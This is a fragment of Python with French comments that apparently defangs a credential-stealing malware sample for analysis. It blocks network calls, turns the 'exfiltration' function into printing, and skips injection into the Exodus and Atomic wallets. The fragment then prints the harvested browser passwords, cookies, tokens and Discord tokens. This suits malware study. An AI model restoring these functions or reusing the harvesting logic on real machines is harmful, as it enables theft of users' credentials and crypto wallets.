...
# ──────────────────────────────────────────────────────────────
# 1) Bloquer toute requête sortante
import requests, websocket
# Override des méthodes HTTP
requests.get  = lambda *a, **k: (_ for _ in ()).throw(Exception("Requête bloquée"))
requests.post = lambda *a, **k: (_ for _ in ()).throw(Exception("Requête bloquée"))
websocket.create_connection = lambda *a, **k: (_ for _ in ()).throw(Exception("WebSocket bloquée"))
...
def upload_to_server(filepath):
    print(f"\n>>> [SIMULATION] exfiltration de : {filepath}")
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        # Si c'est du texte, essayer de décoder ; sinon indiquer la taille brute
        try:
            text = data.decode('utf-8', errors='ignore')
            print(text)
        except:
            print(f"<{len(data)} bytes binaire>")
...
# ──────────────────────────────────────────────────────────────
# 4) Neutraliser inject() et inject_atomic() pour qu'elles ne touchent à rien

def inject():
    print("[SIMULATION] inject() appelé – injection dans Exodus SKIPPED")
...
def inject_atomic():
    print("[SIMULATION] inject_atomic() appelé – injection dans Atomic SKIPPED")
...
# ──────────────────────────────────────────────────────────────
# Affichage de tout ce qui a été collecté
...
if PASSWORDS:
    print("\n-- mots de passe --")
    for pw in PASSWORDS:
        print(f"{pw['browser']} / {pw['profile']} → {pw['url']} | {pw['username']} / {pw['password']}")

if COOKIES:
    print("\n-- cookies --")
    for ck in COOKIES:
        print(f"{ck['browser']} / {ck['profile']} →")
        print(base64.b64decode(ck["cookies"]).decode(errors='ignore'))

if WEB_DATA:
    print("\n-- web tokens --")
    for w in WEB_DATA:
        print(f"{w['browser']} / {w['profile']} → {w['service']} = {w['token']}")

if DISCORD_TOKENS:
    print("\n-- discord tokens --")
    for d in DISCORD_TOKENS:
        print(f"{d['username']} ({d['user_id']}) → {d['token']}")

print("\n-- fichiers sensibles trouvés --")
# la recherche de fichiers stocke et appelle upload_to_server, 
# donc ici on a déjà print chaque match dans upload_to_server
print("Voir ci‑dessus pour la liste complète.")
